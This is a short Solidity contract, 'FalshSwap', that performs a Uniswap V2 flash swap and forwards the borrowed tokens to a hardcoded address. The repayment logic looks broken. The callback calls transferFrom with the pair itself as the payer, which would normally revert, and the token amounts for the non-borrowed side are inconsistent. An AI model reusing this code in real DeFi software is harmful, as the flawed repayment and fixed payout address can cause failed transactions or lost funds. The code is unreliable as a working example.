pragma solidity ^0.8.19;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
  function getPair(address tokenA, address tokenB) external view returns (address pair);  function allPairs(uint) external view returns (address pair);  function feeToSetter() external view returns (address);
}

interface IUniswapV2Pair {
  function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
  function token0() external view returns (address);
  function token1() external view returns (address);
}

interface IUniswapV2Router01 {
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function factory() external pure returns (address);
}

contract FalshSwap{
    IUniswapV2Router01 public  router = IUniswapV2Router01(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Factory public  factory = IUniswapV2Factory(router.factory());
    address wsj = 0x3A9fC286AA956C38d8C76AA4805bE50C23D41995;

function haha(address pay_token_address,address token_address,uint256 pay_amount)  public{
    address token0 = pay_token_address > token_address ? token_address : pay_token_address;
    address token1 = pay_token_address > token_address ? pay_token_address : token_address;
    address[] memory path = new address[](2);
    path[0] = pay_token_address;
    path[1] = token_address;
    uint256 AmountsOut;
    AmountsOut = router.getAmountsOut(pay_amount, path)[1];
    uint256 borrow_amount = AmountsOut * 997 / 1000;
    uint256 amount0 = token_address == token0 ? borrow_amount : 1001;
    uint256 amount1 = token_address == token1 ? borrow_amount : 1;
    address pair;
    pair = factory.getPair(token0, token1);
    bytes memory data = abi.encode(pay_token_address,pay_amount,token_address);
    IUniswapV2Pair(pair).swap(amount0,amount1,address(this),data);
}

function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public {
    address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
    address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
    address pair = factory.getPair(token0, token1);
    require(msg.sender == pair,"666");
    (address pay_token_address,uint256 pay_amount,address token_address) = abi.decode(data,(address,uint256,address));
    IERC20(token_address).transfer(wsj,IERC20(token_address).balanceOf(address(this)));
    IERC20(pay_token_address).transferFrom(msg.sender,pair,pay_amount+1);

}






}